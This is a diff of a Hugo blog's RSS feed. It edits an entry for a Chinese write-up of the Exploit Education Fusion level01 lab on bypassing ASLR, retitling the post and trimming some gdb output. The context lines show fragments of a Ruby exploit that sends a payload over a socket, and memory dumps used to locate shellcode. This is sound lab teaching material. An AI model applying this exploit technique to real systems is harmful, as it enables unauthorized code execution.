@@ -7,12 +7,12 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <lastBuildDate>Wed, 27 Apr 2022 00:00:00 +0000</lastBuildDate><atom:link href="/categories/fusion/index.xml" rel="self" type="application/rss+xml" /><item>
-        <title>年轻人的第一次 ASLR</title>
+        <title>年轻人的第一次绕过 ASLR</title>
         <link>/p/fusion_level_01/</link>
         <pubDate>Wed, 27 Apr 2022 00:00:00 +0000</pubDate>
         
         <guid>/p/fusion_level_01/</guid>
-        <description>&lt;img src="/p/fusion_level_01/cover.png" alt="Featured image of post 年轻人的第一次 ASLR" /&gt;&lt;h2 id=&#34;level-01&#34;&gt;Level 01&lt;/h2&gt;
+        <description>&lt;img src="/p/fusion_level_01/cover.png" alt="Featured image of post 年轻人的第一次绕过 ASLR" /&gt;&lt;h2 id=&#34;level-01&#34;&gt;Level 01&lt;/h2&gt;
 &lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://exploit.education/fusion/level01/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;☞ https://exploit.education/fusion/level01/&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;About&lt;/strong&gt;&lt;/p&gt;
@@ -374,15 +374,7 @@ realpath - return the canonicalized absolute pathname&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;puts&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;gt; payload: &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inspect&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;socket&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;以及，我们并不知道 shellcode 真正的地址，所以这次我们也通过 esp 来计算偏移：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; c
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Continuing.
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Program received signal SIGTRAP, Trace/breakpoint trap.
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0xbf82b365 in ?? &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/wx &lt;span class=&#34;nv&#34;&gt;$esp&lt;/span&gt; 
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0xbf82b300:	0x90909090
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/140x 0xbf82b260
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gdb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; x/140x 0xbf82b260
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0xbf82b260:    0xbf82b31c    0xbf82b270    0x080484fc    0x00000200
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0xbf82b270: 2.&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0x7777772f&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;   0x77777777    0x77777777    0x77777777
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#                        &amp;lt;-- 0x77777777 --&amp;gt;&lt;/span&gt;
